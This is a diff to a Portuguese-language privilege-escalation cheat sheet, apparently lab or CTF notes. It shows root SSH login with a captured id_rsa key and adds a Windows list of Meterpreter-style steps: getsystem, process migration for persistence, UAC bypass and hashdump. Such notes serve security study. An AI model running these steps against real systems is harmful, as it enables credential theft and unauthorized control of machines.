@@ -35,7 +35,7 @@ Se tiver leitura, copie o conteúdo, salve como id_rsa localmente e:
 chmod 600 id_rsa
 ssh root@<IP> -i id_rsa
 ```
-### 🔎 Enumeração de Sistema e Ambiente
+### 🔎 Enumeração de Sistema e Ambiente Linux
 
 ```bash
 # Informações do kernel e sistema
@@ -48,6 +48,21 @@ cat /etc/os-release
 echo $PATH
 env
 set
+```
+### 🔎 Enumeração de Sistema e Ambiente Windows
+
+```bash
+sysinfo
+getuid
+whoami /priv
+getsystem
+ps
+getpid e depois migrate id_de_outro_processo_para_persisntecia
+bypass de UAC
+hashdump
+
+
+
 ```
 
 ### 🔐 Permissões Sudo
